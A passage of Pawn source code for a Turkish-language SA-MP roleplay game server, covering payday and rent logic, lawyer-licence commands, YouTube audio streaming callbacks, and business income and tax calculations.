				    if(Karakter[playerid][rutbe] == 14) maas = Birlik[Karakter[playerid][birlik]][rutbe14maas];
				    if(Karakter[playerid][rutbe] == 15) maas = Birlik[Karakter[playerid][birlik]][rutbe15maas];
				    if(Karakter[playerid][rutbe] == 16) maas = Birlik[Karakter[playerid][birlik]][rutbe16maas];
				    if(Karakter[playerid][rutbe] == 17) maas = Birlik[Karakter[playerid][birlik]][rutbe17maas];
				    if(Karakter[playerid][rutbe] == 18) maas = Birlik[Karakter[playerid][birlik]][rutbe18maas];
				    if(Karakter[playerid][rutbe] == 19) maas = Birlik[Karakter[playerid][birlik]][rutbe19maas];
				    if(Karakter[playerid][rutbe] == 20) maas = Birlik[Karakter[playerid][birlik]][rutbe20maas];
				}

				new _para;
				switch(Karakter[playerid][level])
				{
				    case 0..4: _para=200;
				    case 5..9: _para=250;
				    case 10..14: _para=300;
				    case 15..19: _para=350;
				    case 20..24: _para=400;
				    case 25..30: _para=500;
				    default: _para=600;
				}
				new paycheck = _para+maas;
				//if(Karakter[playerid][isbasi] || Karakter[playerid][medisbasi] || Karakter[playerid][sisbasi]) paycheck = _para+maas;
				//else paycheck = _para;
				Karakter[playerid][payday]--;
				if(Karakter[playerid][payday] < 0) Karakter[playerid][payday] = 60;
				if(Karakter[playerid][payday] <= 0)
				{
				    if(Karakter[playerid][silahpayday] > 0) {
						Karakter[playerid][silahpayday]--;
						if(Karakter[playerid][silahpayday] == 0 && Karakter[playerid][silahuretimid] > 0) {
							Bilgi(playerid, "Silahýnýzý '/silahal' komutu kullanarak alabilirsiniz.");
						}
					}
					if(Karakter[playerid][exp] >= levelup-1)
					{
					    Karakter[playerid][level]++;
					    Karakter[playerid][ozellik]++;
					    if(Karakter[playerid][level] == 5) paycheck +=5000;
					    if(Karakter[playerid][level] == 10) paycheck +=10000;
					    if(Karakter[playerid][level] == 15) paycheck +=15000;
					    if(Karakter[playerid][level] == 20) paycheck +=20000;
					    if(Karakter[playerid][unlu]) paycheck = floatround(paycheck*1.15);
					    Karakter[playerid][exp] = 0;
					    Karakter[playerid][payday] = 60;
					    new pbanka;
					    pbanka = BankaPara(playerid);
						foreach(new iyy : Business)
						{
							if(IsyeriPayday(playerid, iyy))
							{
   								if(Isyeri[iyy][ivergi] < floatround((Isyeri[iyy][ifiyat]*35)/100) && Isyeri[iyy][isahip] != -1 && Isyeri[iyy][isahip] != 10)
	                                Isyeri[iyy][ikasa] += IsyeriGelir(iyy);
								else
									Hata(playerid, "Ýþ yeriniz vergi kilidinde olduðundan dolayý gelir almadýnýz.");

							    if(Karakter[playerid][sqlid] == Isyeri[iyy][kiralayan])
							    {
					    			paycheck -= Isyeri[iyy][kirafiyat];
									new pbanka2;
			            			pbanka2 = BankaParaSQL(Isyeri[iyy][isahip]);
									pbanka2 += Isyeri[iyy][kirafiyat];
									BankaParaDuzenSQL(Isyeri[iyy][isahip], pbanka2);
					    			sex=1, idd=iyy;
					    			foreach(new i : Player)
									{
								    	if(Karakter[i][sqlid] == Isyeri[iyy][isahip])
								   		{
								     	   Bilgi(playerid, "Ýþyeri kiranýz banka hesabýnýza yatmýþtýr.");
								    	}
									}
								}
							}
							IsyeriKaydet(iyy);
							IsyeriAyarla(iyy);
						}
						foreach(new iy : Houses)
						{
						    if(Ev[iy][kiralayan] == Karakter[playerid][sqlid])
						    {
						        paycheck -= Ev[iy][kirafiyat];
						        new pbanka2;
           						pbanka2 = BankaParaSQL(Ev[iy][esahip]);
								pbanka2 += Ev[iy][kirafiyat];
								BankaParaDuzenSQL(Ev[iy][esahip], pbanka2);
						        sex2=1, iddd=iy;
						        foreach(new i : Player)
								{
								    if(Karakter[i][sqlid] == Ev[iy][esahip])
								    {
								        Bilgi(playerid, "Ev kiranýz banka hesabýnýza yatmýþtýr.");
								    }
								}
						    }
						}
						if(HappyHour())
						{
						    Karakter[playerid][exp] = 1;
						    paycheck = paycheck*2;
						    GameTextForPlayer(playerid, "~b~~h~H~w~appy ~b~~h~H~w~our", 3000, 6);
						}
						if(g2xpayday) { pbanka += 2*paycheck; GameTextForPlayer(playerid, "~y~~h~2~w~X ~y~~h~P~w~ayday", 3000, 6); Karakter[playerid][exp] = 1; }
						else { pbanka += paycheck; }
						BankaParaDuzen(playerid, pbanka);
					    SendClientMessage(playerid, COLOR_WHITE, ""C2"[PAYDAY]");
						if(g2xpayday) format(string, sizeof(string), ""C2"[PAYDAY] "C5"%d$ kazandýnýz. Bakiye: %d$", paycheck*2, pbanka);
						else format(string, sizeof(string), ""C2"[PAYDAY] "C5"%d$ kazandýnýz. Bakiye: %d$", paycheck, pbanka);
						SendClientMessage(playerid, COLOR_WHITE, string);
						GameTextForPlayer(playerid, "~r~~h~L~w~evel ~r~~h~U~w~p", 3000, 6);
						if(sex == 1) Ipucu(playerid, "Ýþyeri kiranýz bankanýzdan çekildi.");
						if(sex2 == 1) Ipucu(playerid, "Ev kiranýz bankanýzdan çekildi.");
						Ipucu(playerid, "'/ozellikgelistir' komutu ile özellik geliþtirebilirsiniz.");
						SetPlayerScore(playerid, Karakter[playerid][level]);
						Karakter[playerid][oyunsure]++;
						KarakterKaydet(playerid);
					}
					else
					{
						if(Karakter[playerid][unlu]) paycheck = floatround(paycheck*1.15);
					    Karakter[playerid][payday] = 60;
					    Karakter[playerid][exp]++;
			            new pbanka;
			            pbanka = BankaPara(playerid);
						foreach(new iyy : Business)
						{
							if(IsyeriPayday(playerid, iyy))
							{
							    if(Isyeri[iyy][ivergi] < floatround((Isyeri[iyy][ifiyat]*35)/100) && Isyeri[iyy][isahip] != -1 && Isyeri[iyy][isahip] != 10)
	                                Isyeri[iyy][ikasa] += IsyeriGelir(iyy);
								else
									Hata(playerid, "Ýþ yeriniz vergi kilidinde olduðundan dolayý gelir almadýnýz.");
									
							    if(Karakter[playerid][sqlid] == Isyeri[iyy][kiralayan] && Isyeri[iyy][kira] == 1)
							    {
					    			paycheck -= Isyeri[iyy][kirafiyat];
									new pbanka2;
			            			pbanka2 = BankaParaSQL(Isyeri[iyy][isahip]);
									pbanka2 += Isyeri[iyy][kirafiyat];
									BankaParaDuzenSQL(Isyeri[iyy][isahip], pbanka2);
					    			sex=1, idd=iyy;
									foreach(new i : Player)
									{
									    if(Karakter[i][sqlid] == Isyeri[iyy][isahip])
									    {
									        Bilgi(playerid, "Ýþyeri kiranýz banka hesabýnýza yatmýþtýr.");
									    }
									}
								}
								IsyeriKaydet(iyy);
								IsyeriAyarla(iyy);
							}
						}
						foreach(new iy : Houses)
						{
						    if(Ev[iy][kiralayan] == Karakter[playerid][sqlid] && Ev[iy][kira] == 1)
						    {
						        paycheck -= Ev[iy][kirafiyat];
						        new pbanka2;
           						pbanka2 = BankaParaSQL(Ev[iy][esahip]);
								pbanka2 += Ev[iy][kirafiyat];
								BankaParaDuzenSQL(Ev[iy][esahip], pbanka2);
						        sex2=1, iddd=iy;
						        foreach(new i : Player)
								{
								    if(Karakter[i][sqlid] == Ev[iy][esahip])
								    {
								        Bilgi(playerid, "Ev kiranýz banka hesabýnýza yatmýþtýr.");
								    }
								}
						    }
						}
						if(HappyHour())
						{
						    Karakter[playerid][exp]++;
						    paycheck = paycheck*2;
						    GameTextForPlayer(playerid, "~b~~h~H~w~appy ~b~~h~H~w~our", 3000, 6);
						}
      					if(g2xpayday) { pbanka += 2*paycheck; GameTextForPlayer(playerid, "~y~~h~2~w~X ~y~~h~P~w~ayday", 3000, 6); Karakter[playerid][exp]++; }
						else { pbanka += paycheck; }
						BankaParaDuzen(playerid, pbanka);
						if(g2xpayday) format(string, sizeof(string), ""C2"[PAYDAY] "C5"%d$ kazandýnýz. Bakiye: %d$", paycheck*2, pbanka);
						else format(string, sizeof(string), ""C2"[PAYDAY] "C5"%d$ kazandýnýz. Bakiye: %d$", paycheck, pbanka);
						SendClientMessage(playerid, COLOR_WHITE, string);
						if(sex == 1) Ipucu(playerid, "Ýþyeri kiranýz bankanýzdan çekildi.");
						if(sex2 == 1) Ipucu(playerid, "Ev kiranýz bankanýzdan çekildi.");
						if(BankaPara(playerid) < 0 && sex == 1)
						{
							Bilgi(playerid, "Ýþyeri kira ücretini ödeyemediðiniz için iþyeri kiradan çýkartýldý.");
							BankaParaDuzen(playerid, 0);
							Isyeri[idd][kiralayan] = -1;
						}
						if(BankaPara(playerid) < 0 && sex2 == 1)
						{
							Bilgi(playerid, "Ev kira ücretini ödeyemediðiniz için ev kiradan çýkartýldý.");
							BankaParaDuzen(playerid, 0);
							Ev[iddd][kiralayan] = -1;
						}
						Karakter[playerid][oyunsure]++;
						KarakterKaydet(playerid);
				    }
				}
		        //format

				new hour,minute,second, yil, gun, ay, aystr[24], saatstr[5], dakikastr[5], gunay[28], saatdakika[6];
				gettime(hour,minute,second);
	            getdate(yil, ay, gun);
				if(hour >= 10) format(saatstr, sizeof(saatstr), "%d", hour);
				else format(saatstr, sizeof(saatstr), "0%d", hour);
				if(minute >= 10) format(dakikastr, sizeof(dakikastr), "%d", minute);
				else format(dakikastr, sizeof(dakikastr), "0%d", minute);
	            format(saatdakika, sizeof(saatdakika), "%s:%s", saatstr, dakikastr);
				PlayerTextDrawSetString(playerid, qwe[playerid][16], saatdakika);
				switch(ay)
				{
				    case 1: strmid(aystr, "Ocak", 0, 4);
				    case 2: strmid(aystr, "Subat", 0, 5);
				    case 3: strmid(aystr, "Mart", 0, 4);
				    case 4: strmid(aystr, "Nisan", 0, 5);
				    case 5: strmid(aystr, "Mayis", 0, 5);
				    case 6: strmid(aystr, "Haziran", 0, 7);
				    case 7: strmid(aystr, "Temmuz", 0, 6);
				    case 8: strmid(aystr, "Agustos", 0, 7);
				    case 9: strmid(aystr, "Eylul", 0, 5);
				    case 10: strmid(aystr, "Ekim", 0, 4);
				    case 11: strmid(aystr, "Kasim", 0, 5);
				    case 12: strmid(aystr, "Aralik", 0, 6);
				}
				format(gunay, sizeof(gunay), "%d_%s", gun, aystr);
				PlayerTextDrawSetString(playerid, qwe[playerid][17], gunay);

			    if(Karakter[playerid][ajail] > 1)
				{
					Karakter[playerid][ajail]--;
					gAFKTIMER[playerid] = 0;
					format(string, sizeof(string), "Kalan dakika: %d", Karakter[playerid][ajail]);
					Bilgi(playerid, string);
					if(!IsPlayerInRangeOfPoint(playerid, 5.0, 1538.5103,-1371.2427,328.2358))
					{
					    SetPlayerPos(playerid, 1538.5103,-1371.2427,328.2358);
					    SetPlayerVirtualWorld(playerid, 2938);
					    TogglePlayerControllable(playerid, 0);
					}
				}
				else if(Karakter[playerid][ajail] == 1)
				{
				    SetPlayerPos(playerid, 1549.7474,-1675.6018,15.1029);
				    SetPlayerFacingAngle(playerid, 88.6741);
				    SetPlayerVirtualWorld(playerid, 0);
				    SetPlayerInteriorEx(playerid, 0);
				    TogglePlayerControllable(playerid, 1);
				    Karakter[playerid][ajail] = 0;
				}

				if(Karakter[playerid][kodes] > 1)
				{
					Karakter[playerid][kodes]--;
					gAFKTIMER[playerid] = 0;
				}
				else if(Karakter[playerid][kodes] == 1)
				{
				    Ipucu(playerid, "Hapis süreniz dolmuþ, ''/hapiscik'' yazarak hapisten çýkabilirsiniz.");
				}
				KarakterKaydet(playerid);
			}
}

CMD:avukatyap(playerid, params[]) {
	if(!Girdi[playerid] || Karakter[playerid][adminlevel] < 5) return 1;
	new oID=-1, aSeviye, mstring[128], playerName[MAX_PLAYER_NAME+1];
	if(sscanf(params,"dd",oID,aSeviye) || aSeviye > 4 || aSeviye < 0) { Kullanim(playerid, "/avukatyap [oyuncuID] [avukatSeviye]"); SendClientMessage(playerid, -1, "Avukat seviyeleri : 0 Deðil, 1 Özel Avukat, 2 Devlet Avukatý, 3 Baro Baþkan Yardýmcýsý, 4 Baro Baþkaný"); return 1; }
	if(!IsPlayerConnected(oID)) return Hata(playerid, "Hatalý oyucu id belirttiniz.");
	if(aSeviye == 0) {
	    GetPlayerName(oID, playerName, sizeof(playerName));
	    format(mstring, sizeof(mstring), "%s isimli oyuncunun avukatlýðýný aldýnýz.", playerName);
		Bilgi(playerid, mstring);
		format(mstring, sizeof(mstring), "%s sizin avukatlýðýnýzý aldý.", Karakter[playerid][nick]);
		Bilgi(oID, mstring);
		Karakter[oID][avukat] = 0;
	}
	else if(aSeviye == 1) {
		GetPlayerName(oID, playerName, sizeof(playerName));
	    format(mstring, sizeof(mstring), "%s isimli oyuncuyu Özel Avukat yaptýnýz.", playerName);
		Bilgi(playerid, mstring);
		format(mstring, sizeof(mstring), "%s sizi Özel Avukat yaptý.", Karakter[playerid][nick]);
		Bilgi(oID, mstring);
		Karakter[oID][avukat] = 1;
	}
	else if(aSeviye == 2) {
		GetPlayerName(oID, playerName, sizeof(playerName));
	    format(mstring, sizeof(mstring), "%s isimli oyuncuyu Devlet Avukatý yaptýnýz.", playerName);
		Bilgi(playerid, mstring);
		format(mstring, sizeof(mstring), "%s sizi Devlet Avukatý yaptý.", Karakter[playerid][nick]);
		Bilgi(oID, mstring);
		Karakter[oID][avukat] = 2;
	}
	else if(aSeviye == 3) {
		GetPlayerName(oID, playerName, sizeof(playerName));
	    format(mstring, sizeof(mstring), "%s isimli oyuncuyu Baro Baþkan Yardýmcýsý yaptýnýz.", playerName);
		Bilgi(playerid, mstring);
		format(mstring, sizeof(mstring), "%s sizi Baro Baþkan Yardýmcýsý yaptý.", Karakter[playerid][nick]);
		Bilgi(oID, mstring);
		Karakter[oID][avukat] = 3;
	}
	else if(aSeviye == 4) {
		GetPlayerName(oID, playerName, sizeof(playerName));
	    format(mstring, sizeof(mstring), "%s isimli oyuncuyu Baro Baþkaný yaptýnýz.", playerName);
		Bilgi(playerid, mstring);
		format(mstring, sizeof(mstring), "%s sizi Baro Baþkaný yaptý.", Karakter[playerid][nick]);
		Bilgi(oID, mstring);
		Karakter[oID][avukat] = 4;
	}
	return 1;
}

CMD:avukat(playerid, params[]) {
	if(!Girdi[playerid]) return 1;
	new oID=-1, aSeviye=-1, nstring[16], mstring[128];
	sscanf(params,"s[16]dd",nstring,oID,aSeviye);
	if(isnull(nstring) && Karakter[playerid][avukat] == 0) { Kullanim(playerid, "/avukat [fonksiyon]"); SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: talep, talepiptal"); return 1;}
	else if(isnull(nstring) && Karakter[playerid][avukat] >= 3) { Kullanim(playerid, "/avukat [fonksiyon]"); SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: talep, talepiptal, lisansver, lisansgoster, talepler"); return 1;}
	else if(isnull(nstring)) { Kullanim(playerid, "/avukat [fonksiyon]"); SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: talep, talepiptal, lisansgoster, talepler"); return 1; }
	if(Buysa(nstring, "lisansver")) {
		if(Karakter[playerid][avukat] < 3) return 0;
		if(oID == -1 || aSeviye == -1 || aSeviye < -1 || aSeviye > 4) { Kullanim(playerid, "/avukat lisansver [oyuncuID] [avukatSeviye]"); SendClientMessage(playerid, -1, "Avukat seviyeleri : 0 Deðil, 1 Özel Avukat, 2 Devlet Avukatý, 3 Baro Baþkan Yardýmcýsý, 4 Baro Baþkaný"); return 1; }
		if(!IsPlayerConnected(oID)) return Hata(playerid, "Hatalý oyucu id belirttiniz.");
		if(aSeviye == 0) {
		    format(mstring, sizeof(mstring), "%s isimli oyuncunun avukatlýðýný aldýnýz.", OyuncuAdiniBul(oID));
			Bilgi(playerid, mstring);
			format(mstring, sizeof(mstring), "%s sizin avukatlýðýnýzý aldý.", OyuncuAdiniBul(playerid));
			Bilgi(oID, mstring);
			Karakter[oID][avukat] = 0;
		}
		else if(aSeviye == 1) {
		    format(mstring, sizeof(mstring), "%s isimli oyuncuyu Özel Avukat yaptýnýz.", OyuncuAdiniBul(oID));
			Bilgi(playerid, mstring);
			format(mstring, sizeof(mstring), "%s sizi Özel Avukat yaptý.", OyuncuAdiniBul(playerid));
			Bilgi(oID, mstring);
			Karakter[oID][avukat] = 1;
		}
		else if(aSeviye == 2) {
		    format(mstring, sizeof(mstring), "%s isimli oyuncuyu Devlet Avukatý yaptýnýz.", OyuncuAdiniBul(oID));
			Bilgi(playerid, mstring);
			format(mstring, sizeof(mstring), "%s sizi Devlet Avukatý yaptý.", OyuncuAdiniBul(playerid));
			Bilgi(oID, mstring);
			Karakter[oID][avukat] = 2;
		}
		else if(aSeviye == 3) {
		    format(mstring, sizeof(mstring), "%s isimli oyuncuyu Baro Baþkan Yardýmcýsý yaptýnýz.", OyuncuAdiniBul(oID));
			Bilgi(playerid, mstring);
			format(mstring, sizeof(mstring), "%s sizi Baro Baþkan Yardýmcýsý yaptý.", OyuncuAdiniBul(playerid));
			Bilgi(oID, mstring);
			Karakter[oID][avukat] = 3;
		}
		else if(aSeviye == 4) {
		    format(mstring, sizeof(mstring), "%s isimli oyuncuyu Baro Baþkaný yaptýnýz.", OyuncuAdiniBul(oID));
			Bilgi(playerid, mstring);
			format(mstring, sizeof(mstring), "%s sizi Baro Baþkaný yaptý.", OyuncuAdiniBul(playerid));
			Bilgi(oID, mstring);
			Karakter[oID][avukat] = 4;
		}
	}
	else if(Buysa(nstring, "lisansgoster")) {
		if(Karakter[playerid][avukat] == 0) return 0;
	    if(oID == -1) return Kullanim(playerid, "/avukat lisansgoster [oyuncuID]");
	    new _mstring[512];
		if(ProxDetectorS(5.0, playerid, oID))
		{
			if(Karakter[playerid][avukat] == 1) format(_mstring, sizeof(_mstring), ""C1"Baðlý Oluðum Kurum : \t"C2"Adalet Bakanlýðý\n"C1"Görev : \t\t"C2"Özel Avukat\n\n\n%s\n"C1"Belge Numarasý : \t"C2"%d", OyuncuAdiniBul(playerid), Karakter[playerid][rozetno]);
			else if(Karakter[playerid][avukat] == 2) format(_mstring, sizeof(_mstring), ""C1"Baðlý Oluðum Kurum : \t"C2"Adalet Bakanlýðý\n"C1"Görev : \t\t"C2"Devlet Avukatý\n\n\n%s\n"C1"Belge Numarasý : \t"C2"%d", OyuncuAdiniBul(playerid), Karakter[playerid][rozetno]);
			else if(Karakter[playerid][avukat] == 3) format(_mstring, sizeof(_mstring), ""C1"Baðlý Oluðum Kurum : \t"C2"Adalet Bakanlýðý\n"C1"Görev : \t\t"C2"Baro Baþkan Yardýmcýsý\n\n\n%s\n"C1"Belge Numarasý : \t"C2"%d", OyuncuAdiniBul(playerid), Karakter[playerid][rozetno]);
			else if(Karakter[playerid][avukat] == 4) format(_mstring, sizeof(_mstring), ""C1"Baðlý Oluðum Kurum : \t"C2"Adalet Bakanlýðý\n"C1"Görev : \t\t"C2"Baro Baþkaný\n\n\n%s\n"C1"Belge Numarasý : \t"C2"%d", OyuncuAdiniBul(playerid), Karakter[playerid][rozetno]);
			ShowPlayerDialog(oID, 175, DIALOG_STYLE_MSGBOX, "ADALET BAKANLIÐI", _mstring, "Kapat", "");
			format(_mstring, sizeof(_mstring), "/me belgeyi %s doðru gösterir.", OyuncuAdiniBul(oID));
			OnPlayerCommandPerformed(playerid, _mstring, 0);
		}
		else Hata(playerid, "Bu oyuncu yakýnýnýzda deðil.");
	}
	else if(Buysa(nstring, "talep")) {
		new aSay=0;
		foreach(new i : Player) {
		    if(Karakter[i][avukat] > 1) aSay++;
		}
		if(aSay == 0) return Hata(playerid, "Þu anda aktif devlet avukatý bulunmamaktadýr.");
		if(talep[playerid] == 1) return Hata(playerid, "Zaten bir talebiniz bulunuyor, talebinizi iptal etmek için '/avukat talepiptal'");
		ShowPlayerDialog(playerid, 455, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Talep", ""C1"Talep mesajýnýzý girin:", "Tamam", "Ýptal");
	}
	else if(Buysa(nstring, "talepiptal")) {
		if(talep[playerid] == 0) return Hata(playerid, "Avukat talebiniz bulunmamaktadýr.");
		talep[playerid] = 0;
		Bilgi(playerid, "Talebiniz iptal edilmiþtir.");
		format(mstring, sizeof(mstring), "{ffd700}[AVUKAT] "C1"%s isimli oyuncu avukat talebini iptal etmiþtir.", OyuncuAdiniBul(playerid));
		foreach(new i : Player) {
			if(Karakter[i][avukat] > 1) SendClientMessage(i, -1, mstring);
		}
	}
	else if(Buysa(nstring, "talepler")) {
	    if(Karakter[playerid][avukat] < 2) return 0;
	    new _mstring[512];
		foreach(new i : Player)
		{
		    if(talep[i] == 1)
		    {
		    	format(_mstring, sizeof(_mstring), "%s"C2"%s["C1"%d"C2"]\n", _mstring, OyuncuAdiniBul(i), i);
			}
		}
		ShowPlayerDialog(playerid, 452, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Talepler", _mstring, "Seç", "Ýptal");
		if(isnull(_mstring)) Hata(playerid, "Herhangi bir talep bulunmamaktadýr.");
	}
	return 1;
}

CMD:avaktif(playerid) {
	if(!Girdi[playerid]) return 1;
	SendClientMessage(playerid, -1, ""C2"[Aktif Avukat Listesi]");
	new _say=0;
	foreach(new i : Player)
	{
	     if(Karakter[i][avukat] > 0 && Girdi[i]) {
			_say++;
	        if(Karakter[i][avukat] == 1) {
	            SendClientMessageEx(playerid, -1, "%s - Özel Avukat - Tel No: %d", OyuncuAdiniBul(i), Karakter[i][telno]);
	        }
	        else {
	        	SendClientMessageEx(playerid, -1, "%s - Devlet Avukatý", OyuncuAdiniBul(i));
	        }
	    }
	}
	if(_say == 0) Hata(playerid, "Aktif avukat bulunmamaktadýr.");
	else Ipucu(playerid, "'/avukat talep' komutu ile devlet avukatý talep edebilirsiniz.");
	return 1;
}

forward OnVpsResponse(index, response_code, data[]);
public OnVpsResponse(index, response_code, data[])
{
	new string[256], link[512];

	if(response_code != 200)
	{
		format(string, sizeof(string), "%s - response code: %i", GetError(response_code), response_code);
		print(string);
		return 0;
	}

	new JSONNode:response = json_parse_string(data);

	if(index == 9999)
	{
		if(json_get_bool(response, "error"))
		{
			json_get_string(response, string, sizeof(string), "message");
			print(string);
		}
		return 0;
	}

	if(json_get_bool(response, "error"))
	{
		json_get_string(response, string, sizeof(string), "message");
		print(string);
		return 0;
	}

	json_get_string(response, link, 512, "file");

	json_close(response);
	format(link, sizeof(link), "yt.eightbornrpg.com/?url=%s", link);
	HTTP(index, HTTP_GET, link, "", "OnYTResponse");
	return 1;
}

forward OnVpsResponse2(index, response_code, data[]);
public OnVpsResponse2(index, response_code, data[])
{
	new string[256], link[512];

	if(response_code != 200)
	{
		format(string, sizeof(string), "%s - response code: %i", GetError(response_code), response_code);
		print(string);
		return 0;
	}

	new JSONNode:response = json_parse_string(data);

	if(index == 9999)
	{
		if(json_get_bool(response, "error"))
		{
			json_get_string(response, string, sizeof(string), "message");
			print(string);
		}
		return 0;
	}

	if(json_get_bool(response, "error"))
	{
		json_get_string(response, string, sizeof(string), "message");
		print(string);
		return 0;
	}

	json_get_string(response, link, 512, "file");

	json_close(response);
	format(link, sizeof(link), "yt.eightbornrpg.com/?url=%s", link);
	HTTP(index, HTTP_GET, link, "", "OnYTResponse2");
	return 1;
}

forward OnYTResponse(index, response_code, data[]);
public OnYTResponse(index, response_code, data[]) {
    new string[256];

	if(response_code != 200)
	{
		format(string, sizeof(string), "%s - response code: %i", GetError(response_code), response_code);
		print(string);
		return 0;
	}
    format(rennieRadyoURL[index],256, "%s", data);
	return 1;
}

forward OnYTResponse2(index, response_code, data[]);
public OnYTResponse2(index, response_code, data[]) {
    new string[256];

	if(response_code != 200)
	{
		format(string, sizeof(string), "%s - response code: %i", GetError(response_code), response_code);
		print(string);
		return 0;
	}
    foreach(new x : Player)
	{
		if(IsPlayerInVehicle(x, GetPlayerVehicleID(index)))
	    {
    		PlayAudioStreamForPlayer(x, data);
 			sarkidinliyo[x] = 1;
		}
	}
	return 1;
}

stock GetError(val)
{
	new error[32];
	switch(val)
	{
		case 1: error = "Bad host";
		case 2: error = "No socket";
		case 3: error = "Can't connect";
		case 4: error = "Can't write";
		case 5: error = "Content too big";
		case 6: error = "Malformed response";
		case 300..308: error = "Redirection";
		case 400..499: error = "Client error";
		case 500..599: error = "Server error";
	}
	return error;
}

AracModifiyeleriSil(veh) {
	AracModifiyeleri[Arac[veh][aid]][ModPaintjob] = 0;
	AracModifiyeleri[Arac[veh][aid]][ModSpoiler] = 0;
	AracModifiyeleri[Arac[veh][aid]][ModRoof] = 0;
	AracModifiyeleri[Arac[veh][aid]][ModLeftSideSkirt] = 0;
	AracModifiyeleri[Arac[veh][aid]][ModRightSideSkirt] = 0;
	AracModifiyeleri[Arac[veh][aid]][ModExhaust] = 0;
	AracModifiyeleri[Arac[veh][aid]][ModWheels] = 0;
	AracModifiyeleri[Arac[veh][aid]][ModFrontBumper] = 0;
	AracModifiyeleri[Arac[veh][aid]][ModRearBumper] = 0;
	AracModifiyeleri[Arac[veh][aid]][ModStereo]  = 0;
	AracModifiyeleri[Arac[veh][aid]][ModHydraulics] = 0;
	AracModifiyeleri[Arac[veh][aid]][ModNitro] = 0;
	BilgileriKaydet(veh);
}

IsyeriGelir(isyeriID) {
	switch(Isyeri[isyeriID][itip]) {
		case 0,2,3,4,5,8,15,16,17,20,21,22,23,24,25,26,27: return 0;
	}
	if(Isyeri[isyeriID][ifiyat] <= 200000) return floatround(Isyeri[isyeriID][ifiyat]*0.002);
	else if(Isyeri[isyeriID][ifiyat] > 200000 && Isyeri[isyeriID][ifiyat] < 250000) return 410;
	else if(Isyeri[isyeriID][ifiyat] >= 250000 && Isyeri[isyeriID][ifiyat] < 300000) return 420;
	else if(Isyeri[isyeriID][ifiyat] >= 300000 && Isyeri[isyeriID][ifiyat] < 350000) return 430;
	else if(Isyeri[isyeriID][ifiyat] >= 350000 && Isyeri[isyeriID][ifiyat] < 400000) return 440;
	else if(Isyeri[isyeriID][ifiyat] >= 400000 && Isyeri[isyeriID][ifiyat] < 500000) return 450;
	else if(Isyeri[isyeriID][ifiyat] >= 500000 && Isyeri[isyeriID][ifiyat] < 600000) return 460;
	else if(Isyeri[isyeriID][ifiyat] >= 600000 && Isyeri[isyeriID][ifiyat] < 700000) return 470;
	else if(Isyeri[isyeriID][ifiyat] >= 700000 && Isyeri[isyeriID][ifiyat] < 800000) return 480;
	else if(Isyeri[isyeriID][ifiyat] >= 800000 && Isyeri[isyeriID][ifiyat] < 900000) return 490;
	else if(Isyeri[isyeriID][ifiyat] >= 900000 && Isyeri[isyeriID][ifiyat] < 1000000) return 500;
	else if(Isyeri[isyeriID][ifiyat] >= 1000000) return 520;
	return 0;
}

IsyeriVergi(isyeriID) {
	switch(Isyeri[isyeriID][itip]) {
		case 8,17,23,27: return 0;
	}
	new Float:katsayi = 1.0;
	if(SQLGetUserBusinessCountForTaxes(Isyeri[isyeriID][isahip]) > 3) katsayi = 1.5;
	if(Isyeri[isyeriID][ifiyat] <= 200000) return floatround(((IsyeriGelir(isyeriID)*4)/24)*katsayi);
	if(Isyeri[isyeriID][ifiyat] > 200000 && Isyeri[isyeriID][ifiyat] < 500000) return floatround(((IsyeriGelir(isyeriID)*5)/24)*katsayi);
	if(Isyeri[isyeriID][ifiyat] >= 500000 && Isyeri[isyeriID][ifiyat] < 750000) return floatround(((IsyeriGelir(isyeriID)*6)/24)*katsayi);
	if(Isyeri[isyeriID][ifiyat] >= 750000) return floatround(((IsyeriGelir(isyeriID)*7)/24)*katsayi);
	return 0;
}

stock Mesaj(playerid, type, const str[], {Float,_}:...)
{
	static
	    args,
	    start,
	    end,
	    string[144]
	;
	#emit LOAD.S.pri 8
	#emit STOR.pri args

	if (args > 12)
	{
		#emit ADDR.pri str
		#emit STOR.pri start

	    for (end = start + (args - 12); end > start; end -= 4)
		{
	        #emit LREF.pri end
	        #emit PUSH.pri
		}
		#emit PUSH.S str
		#emit PUSH.C 144
		#emit PUSH.C string
		#emit PUSH.C args
		#emit SYSREQ.C format

		switch(type) {
            case BILGI_MESAJ: Bilgi(playerid, string);
            case HATA_MESAJ: Hata(playerid, string);
            case IPUCU_MESAJ: Ipucu(playerid, string);
            case KULLANIM_MESAJ: Kullanim(playerid, string);
        }

		#emit LCTRL 5
		#emit SCTRL 4
		#emit RETN
	}
	format(string, sizeof(string), "%s", str);
    switch(type) {
        case BILGI_MESAJ: return Bilgi(playerid, string);
        case HATA_MESAJ: return Hata(playerid, string);
        case IPUCU_MESAJ: return Ipucu(playerid, string);
        case KULLANIM_MESAJ: return Kullanim(playerid, string);
    }
    return 1;
}

stock SendClientMessageEx(playerid, color, const str[], {Float,_}:...)
{
	static
	    args,
	    start,
	    end,
	    string[144]
	;
	#emit LOAD.S.pri 8
	#emit STOR.pri args

	if (args > 12)
	{
		#emit ADDR.pri str
		#emit STOR.pri start

	    for (end = start + (args - 12); end > start; end -= 4)
		{
	        #emit LREF.pri end
	        #emit PUSH.pri
		}
		#emit PUSH.S str
		#emit PUSH.C 144
		#emit PUSH.C string
		#emit PUSH.C args
		#emit SYSREQ.C format

		SendClientMessage(playerid, color, string);

		#emit LCTRL 5
		#emit SCTRL 4
		#emit RETN
	}
	return SendClientMessage(playerid, color, str);
}

stock Bilgi(playerid, message[]) return SendClientMessageEx(playerid, -1, "{f9f9f9}"NOKTA" {5cb85c}%s", message);
stock Hata(playerid, message[]) return SendClientMessageEx(playerid, -1, "{f9f9f9}"NOKTA" {d9534f}%s", message);
stock Ipucu(playerid, message[]) return SendClientMessageEx(playerid, -1, ""C2"(( {f9f9f9}%s "C2"))", message);
stock Kullanim(playerid, message[]) return SendClientMessageEx(playerid, -1, "{f9f9f9}"NOKTA" (KULLANIM) %s", message);

SQLGetUserBusinessCountForTaxes(_sqlid){
	new _result=0, query[512];
	format(query, sizeof(query), "SELECT COUNT(*) FROM `isyerleri` WHERE `isahip` = '%d' AND `tip` != '0' AND `tip` != '2' AND `tip` != '3' \
	AND `tip` != '4' AND `tip` != '5' AND `tip` != '8' AND `tip` != '15' AND `tip` != '16' AND `tip` != '17' AND `tip` != '20' \
